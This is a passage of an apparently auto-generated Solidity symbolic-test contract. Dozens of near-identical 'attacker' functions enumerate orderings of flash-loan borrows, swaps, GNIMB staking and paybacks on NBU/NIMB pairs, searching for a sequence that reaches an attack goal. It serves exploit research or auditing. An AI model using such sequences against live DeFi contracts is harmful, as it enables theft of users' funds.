        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5063(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5064(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5065(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5066(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5067(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5068(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5069(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5070(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nimb(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5071(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5072(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5073(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5074(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5075(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5076(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5077(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5078(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5079(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5080(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5081(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5082(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5083(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5084(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5085(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5086(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5087(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5088(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5089(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5090(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5091(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5092(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5093(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5094(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5095(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5096(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5097(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbugnimb_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5098(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbugnimb_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5099(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5100(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5101(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5102(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5103(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5104(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5105(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5106(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5107(
        uint256 amt0,
        uint256 amt1,
